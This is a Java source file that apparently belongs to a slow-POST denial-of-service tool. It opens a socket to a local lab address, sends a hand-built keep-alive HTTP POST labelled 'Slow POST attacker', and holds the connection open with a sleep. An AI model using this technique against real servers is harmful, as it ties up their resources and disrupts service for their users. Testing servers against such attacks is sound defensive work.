package com.dorin.slowpost;

import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

import static com.dorin.slowpost.Configurations.THREAD_SLEEP_TIME;

public class TcpPostConnection {
    private static final Gson gson = new Gson();

    public void run() throws IOException {
        Socket s = new Socket(InetAddress.getByName("192.168.1.3"), 3000);
        PrintWriter pw = new PrintWriter(s.getOutputStream());
//        pw.println("Keep-Alive: 900");

        pw.println("POST /users HTTP/1.1");
        pw.println("content-type: application/json");
        pw.println("cache-control: no-cache");
        pw.println("user-agent: Slow POST attacker");
        pw.println("accept: */*");
        pw.println("host: 192.168.1.3:3000");
        pw.println("accept-encoding: gzip, deflate");
//        pw.println("content-length: 32");
        pw.println("connection: keep-alive");
        pw.println("");

//            pw.println("{messi: jora, age: 30}");
        String postObject = gson.toJson(new User("Messi", 40));
        pw.println(postObject);
        pw.println("");
        pw.flush();

        try {
            Thread.sleep(THREAD_SLEEP_TIME);
        } catch (InterruptedException e) {
            System.out.println("Thread sleep interrupted");
        }
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String t;
        while ((t = br.readLine()) != null) System.out.println(t);
        br.close();
    }
}
